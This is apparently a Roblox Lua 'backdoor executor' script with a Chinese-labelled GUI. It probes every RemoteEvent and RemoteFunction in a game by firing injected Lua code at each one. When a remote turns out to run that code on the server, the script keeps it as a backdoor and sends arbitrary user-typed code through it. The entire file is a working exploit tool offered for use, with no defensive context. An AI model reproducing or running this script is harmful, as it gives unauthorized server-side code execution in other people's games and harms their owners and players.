 local ScreenGui= Instance.new("ScreenGui") ScreenGui.Name= "V6" ScreenGui.Parent= game:GetService("CoreGui").RobloxGui

local MainFrame = Instance.new("Frame") MainFrame.Size= UDim2.new(0, 400, 0, 300) MainFrame.Position= UDim2.new(0.5, -200, 0.5, -150) MainFrame.BackgroundColor3= Color3.fromRGB(35, 35, 35) MainFrame.BorderSizePixel= 0 MainFrame.Active= true MainFrame.Draggable= true MainFrame.Parent= ScreenGui

local CloseButton = Instance.new("TextButton") CloseButton.Size= UDim2.new(0, 20, 0, 20) CloseButton.Position= UDim2.new(1, -25, 0, 5) CloseButton.BackgroundColor3= Color3.fromRGB(200, 50, 50) CloseButton.TextColor3= Color3.fromRGB(255, 255, 255) CloseButton.Text= "X" CloseButton.Font= Enum.Font.SourceSansBold CloseButton.Parent= MainFrame

local InputBox = Instance.new("TextBox") InputBox.Size= UDim2.new(0, 380, 0, 200) InputBox.Position= UDim2.new(0, 10, 0, 30) InputBox.BackgroundColor3= Color3.fromRGB(25, 25, 25) InputBox.TextColor3= Color3.fromRGB(255, 255, 255) InputBox.Text= "" InputBox.TextWrapped= true InputBox.TextXAlignment= Enum.TextXAlignment.Left InputBox.TextYAlignment= Enum.TextYAlignment.Top InputBox.Parent= MainFrame

local ExecuteButton = Instance.new("TextButton") ExecuteButton.Size= UDim2.new(0, 185, 0, 40) ExecuteButton.Position= UDim2.new(0, 10, 0, 240) ExecuteButton.BackgroundColor3= Color3.fromRGB(80, 160, 80) ExecuteButton.TextColor3= Color3.fromRGB(255, 255, 255) ExecuteButton.Text= "执行" ExecuteButton.Font= Enum.Font.SourceSansBold ExecuteButton.Parent= MainFrame

local ClearButton = Instance.new("TextButton") ClearButton.Size= UDim2.new(0, 185, 0, 40) ClearButton.Position= UDim2.new(0, 205, 0, 240) ClearButton.BackgroundColor3= Color3.fromRGB(160, 80, 80) ClearButton.TextColor3= Color3.fromRGB(255, 255, 255) ClearButton.Text= "清空" ClearButton.Font= Enum.Font.SourceSansBold ClearButton.Parent= MainFrame

local StatusLabel = Instance.new("TextLabel") StatusLabel.Size= UDim2.new(0, 100, 0, 20) StatusLabel.Position= UDim2.new(0, 10, 0, 5) StatusLabel.BackgroundTransparency= 1 StatusLabel.TextColor3= Color3.fromRGB(255, 255, 255) StatusLabel.Text= "未连接" StatusLabel.Font= Enum.Font.SourceSansBold StatusLabel.Parent= MainFrame

local attached = false local backdoor= nil local remoteCodes= {} local STRING_VALUE_NAME= tostring(math.random(1000000, 9999999))

local function scanDescendants(parent) local descendance = parent:GetDescendants() for i = 1, #descendance do local descendant = descendance[i] local class = descendant.ClassName
    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
        continue
    end
    
    if descendant:IsDescendantOf(game:GetService("JointsService")) or 
       descendant:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
        continue
    end
    
    local remoteCode = tostring(math.random(100000, 999999))
    remoteCodes[remoteCode] = descendant
    
    local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
    
    if class == "RemoteEvent" then
        descendant:FireServer(requireScript)
    elseif class == "RemoteFunction" then
        pcall(function()
            descendant:InvokeServer(requireScript)
        end)
    end
    
    if game.Workspace:FindFirstChild(STRING_VALUE_NAME) then
        attached = true
        backdoor = remoteCodes[game.Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
        backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
        StatusLabel.Text = "已连接"
        StatusLabel.TextColor3 = Color3.fromRGB(95, 185, 47)
        return true
    end
end
return false

end

local function scanGame() local commonPlaces = { game:GetService("ReplicatedStorage"), game:GetService("Workspace"), game:GetService("Lighting") }
for i = 1, #commonPlaces do
    if scanDescendants(commonPlaces[i]) then
        return true
    end
end

local children = game:GetChildren()
for i = 1, #children do
    local child = children[i]
    local skip = false
    
    for j = 1, #commonPlaces do
        if child == commonPlaces[j] then
            skip = true
            break
        end
    end
    
    if not skip and scanDescendants(child) then
        return true
    end
end

return false
end

local function executeScript(script) if not attached then if scanGame() then executeScript(script) else StatusLabel.Text = "连接失败" StatusLabel.TextColor3 = Color3.fromRGB(255, 50, 50) end return end
if backdoor.ClassName == "RemoteEvent" then
    backdoor:FireServer(script)
elseif backdoor.ClassName == "RemoteFunction" then
    pcall(function()
        backdoor:InvokeServer(script)
    end)
end
end

ExecuteButton.MouseButton1Click:Connect(function() executeScript(InputBox.Text) end)

ClearButton.MouseButton1Click:Connect(function() InputBox.Text = "" end)

CloseButton.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

scanGame()